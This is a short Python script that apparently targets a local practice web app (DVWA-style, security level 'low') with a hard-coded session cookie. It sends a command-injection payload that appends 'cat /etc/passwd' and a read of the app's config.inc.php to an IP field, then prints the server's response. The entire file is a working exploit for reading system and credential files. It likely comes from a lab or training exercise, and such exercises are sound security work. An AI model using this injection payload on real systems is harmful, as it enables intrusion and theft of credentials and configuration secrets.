
import requests

# Use the valid session
cookies = {
    'PHPSESSID': '1kn1ob24jumb83um8dd8re8ob3',
    'security': 'low'
}

# Command injection - read sensitive files
payload = {
    'ip': '127.0.0.1;cat /etc/passwd;cat /var/www/html/config/config.inc.php',
    'Submit': 'Submit'
}

url = 'http://localhost:28080/vulnerabilities/exec/'
response = requests.get(url, params=payload, cookies=cookies)

print("=== COMMAND INJECTION RESULT ===")
print(f"Status: {response.status_code}")
print(f"\nResponse body (first 2000 chars):\n")
print(response.text[:2000])

